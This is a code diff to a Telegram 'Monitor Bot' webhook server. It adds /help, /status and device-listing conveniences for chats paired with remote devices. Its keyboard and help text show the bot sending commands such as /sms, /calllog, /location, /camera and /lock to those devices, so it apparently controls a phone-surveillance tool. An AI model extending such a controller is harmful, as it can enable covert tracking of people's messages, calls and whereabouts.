@@ -101,7 +101,8 @@ const mainKeyboard = {
       ['/appusage', '/apps', '/camera'],
       ['/hotspot on', '/hotspot off', '/lock'],
       ['/unlock', '/sim', '/battery'],
-      ['/device', '/charging', '/custom']
+      ['/device', '/charging', '/custom'],
+      ['/listdevices', '/status', '/help']
     ],
     resize_keyboard: true,
     one_time_keyboard: false
@@ -180,12 +181,31 @@ app.post('/webhook', async (req, res) => {
 
     // Handle /start command
     if (text === '/start') {
-      bot.sendMessage(chatId, 'Welcome! Use /listdevices to see available devices, then /pair <deviceId> to connect.', mainKeyboard)
-        .catch(console.error);
+      bot.sendMessage(chatId, 
+        'Welcome to Monitor Bot!\n\n' +
+        'Commands:\n' +
+        '/listdevices – Show all registered devices\n' +
+        '/pair <deviceId> – Pair this chat with a device\n' +
+        '/status – Show current paired device\n' +
+        '/help – Show this menu',
+        mainKeyboard
+      ).catch(console.error);
       return res.sendStatus(200);
     }
 
-    // Handle /listdevices command
+    // Handle /help
+    if (text === '/help') {
+      bot.sendMessage(chatId,
+        'Commands:\n' +
+        '/listdevices – Show all devices with online status\n' +
+        '/pair <deviceId> – Pair this chat with a device\n' +
+        '/status – Show current paired device\n' +
+        '/sms, /calllog, /location, etc. – Send command to paired device'
+      ).catch(console.error);
+      return res.sendStatus(200);
+    }
+
+    // Handle /listdevices
     if (text === '/listdevices') {
       const { data, error } = await supabase
         .from('devices')
@@ -205,7 +225,7 @@ app.post('/webhook', async (req, res) => {
       return res.sendStatus(200);
     }
 
-    // Handle /pair command
+    // Handle /pair
     if (text.startsWith('/pair ')) {
       const deviceId = text.substring(6).trim();
       if (!deviceId) {
@@ -219,7 +239,7 @@ app.post('/webhook', async (req, res) => {
         .eq('id', deviceId)
         .maybeSingle();
       if (error || !data) {
-        bot.sendMessage(chatId, 'Device not found.').catch(console.error);
+        bot.sendMessage(chatId, 'Device not found. Use /listdevices to see available devices.').catch(console.error);
         return res.sendStatus(200);
       }
       const success = await pairChatWithDevice(chatId, deviceId);
@@ -232,10 +252,23 @@ app.post('/webhook', async (req, res) => {
       return res.sendStatus(200);
     }
 
-    // Handle normal commands – get device ID for this chat
+    // Handle /status
+    if (text === '/status') {
+      const deviceId = await getDeviceIdForChat(chatId);
+      if (!deviceId) {
+        bot.sendMessage(chatId, 'No device paired with this chat. Use /listdevices and /pair.').catch(console.error);
+        return res.sendStatus(200);
+      }
+      const online = devices.has(deviceId);
+      const status = online ? '🟢 online' : '🔴 offline';
+      bot.sendMessage(chatId, `Paired device: ${deviceId} (${status})`).catch(console.error);
+      return res.sendStatus(200);
+    }
+
+    // Handle normal commands – get paired device
     const deviceId = await getDeviceIdForChat(chatId);
     if (!deviceId) {
-      bot.sendMessage(chatId, '❌ No device paired with this chat. Use /listdevices and /pair <deviceId> first.')
+      bot.sendMessage(chatId, '❌ No device paired. Use /listdevices and /pair first.')
         .catch(console.error);
       return res.sendStatus(200);
     }
